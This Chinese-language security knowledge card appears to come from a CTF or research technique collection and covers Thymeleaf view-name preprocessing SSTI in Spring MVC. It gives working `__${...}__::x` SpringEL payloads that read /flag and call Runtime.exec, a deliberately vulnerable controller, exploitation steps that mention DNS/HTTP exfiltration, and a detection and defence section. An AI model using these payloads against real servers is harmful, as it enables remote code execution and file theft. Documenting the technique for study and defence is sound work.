---
id: web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti
title: Thymeleaf 视图名预处理 SSTI：__${...}__::x 读取文件与 Runtime.exec
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-viewname-preprocessing-ssti
aliases:
- Thymeleaf SSTI
- 视图名预处理
- __${}__::x
- Thymeleaf 模板名注入
- SpringEL Thymeleaf RCE
- thymeleaf view name ssti
tags:
- ssti
- thymeleaf
- spring
- spel
- view-name
- rce
- file-read
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:26+08:00'
  notes: 已对照原文与图片核对；未在真实 Spring/Thymeleaf 环境复跑
---

## 一句话结论

Spring MVC Controller 把用户输入直接作为视图名返回时，Thymeleaf 会对视图名做表达式预处理；构造 `__${表达式}__::x` 即可让 SpringEL 执行任意 Java 表达式，读取文件或调用 `Runtime.exec`。若存在文件上传覆盖模板，也可直接写入恶意 Thymeleaf 模板。

## 原理

`@Controller` 方法返回的字符串被 Spring 当作视图名，交给 `ThymeleafViewResolver` 解析。Thymeleaf 的视图名支持预处理语法 `__${...}__`：在解析模板前先对 `__${...}__` 中的表达式求值，并把结果替换进视图名。若视图名来自用户输入且未过滤，攻击者可以注入 `__${...}__::x`，让表达式在模板解析阶段执行。

Thymeleaf 在 Spring 环境下使用 SpringEL（`T(...)` 类型引用、方法调用、构造器）。因此：

- 读文件：`new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()`；
- 执行命令：`T(java.lang.Runtime).getRuntime().exec('calc')`；
- 表达式结果通过 `::x` 片段选择器参与视图解析，触发预处理。

这不是 Thymeleaf 模板内的普通 `${}` 注入，而是“视图名”这一层被当作表达式处理，绕过了模板内容层的沙箱假设。

## 触发条件

- Spring MVC + Thymeleaf；
- Controller 直接把请求参数作为视图名返回（如 `return cmd;`、`return "redirect:"+input` 等）；
- Thymeleaf 视图解析器启用（默认）；
- 目标存在可读文件/可执行命令权限；
- 或有文件上传能覆盖模板文件。

## 利用步骤

1. 找到返回用户输入作为视图名的接口：访问正常值返回对应模板，访问不存在值报模板找不到。
2. 用 `__${7*7}__::x` 观察是否触发表达式求值/报错变化。
3. 读文件：`__${new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()}__::x`。
4. 执行命令：`__${T(java.lang.Runtime).getRuntime().exec('calc')}__::x`；无回显时用 DNS/HTTP 外带或写文件。
5. 若有上传：上传含 `th:fragment` 的恶意 HTML 覆盖原路由读取的模板，再访问触发。

## PoC

Controller（漏洞环境）：

```java
@Controller
public class ThymeleafController {
    @GetMapping("/cmd")
    public String eval(@RequestParam String cmd) {
        return cmd;   // 用户输入成为视图名
    }
}
```

读文件：

```text
/cmd?cmd=__${new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()}__::x
```

命令执行：

```text
/cmd?cmd=__${T(java.lang.Runtime).getRuntime().exec('calc')}__::x
```

文件上传覆盖模板（恶意模板）：

```html
<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<body>
<div th:fragment="main">
  <span th:text="'hello ' + ${message}"></span>
</div>
</body>
</html>
```

## 变体与关联

- 表达式变体：`T(java.lang.Runtime)`、`T(java.lang.ProcessBuilder)`、Spring Bean 引用 `@beanName`、`new java.io.FileReader`。
- 入口变体：Controller 返回值、`redirect:`/`forward:` 前缀、错误页视图名、`ModelAndView` 的 viewName。
- 文件上传变体：覆盖模板文件后，模板内的 `${...}` 会在正常渲染时执行。
- 关联：[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]]（Thymeleaf 片段表达式与 `$$` 绕过）；通用 SSTI 引擎识别卡。
- 注意：Thymeleaf 自身的静态黑名单不能阻止视图名预处理层的 SpringEL 执行。

## 检测与防御

- 检测：请求参数中出现 `__${`、`T(java.lang.Runtime)`、`ProcessBuilder`、`FileReader`、`::` 片段选择器；视图名包含表达式语法；模板目录出现新上传文件。
- 防御：不要用用户输入作为视图名；对 viewName 做白名单/固定映射；升级 Thymeleaf/Spring；模板目录只读；限制上传覆盖模板；对 `__${...}__` 预处理输入做拦截。
- 注意：只在模板内容里过滤 `${}` 不够，视图名层的预处理同样可执行表达式。
